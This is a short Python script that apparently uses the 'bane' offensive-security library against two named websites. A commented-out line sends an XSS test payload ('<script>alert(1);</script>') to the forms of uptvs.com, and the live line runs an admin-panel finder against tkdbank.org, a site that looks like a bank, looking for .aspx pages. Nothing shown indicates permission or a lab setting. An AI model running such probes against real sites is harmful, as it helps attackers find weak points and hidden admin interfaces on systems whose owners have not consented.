import requests
import bane
# print(bane.xss_forms('http://uptvs.com',payload='<script>alert(1);</script>'))
bane.admin_panel_finder('http://tkdbank.org',logs=True,ext='aspx')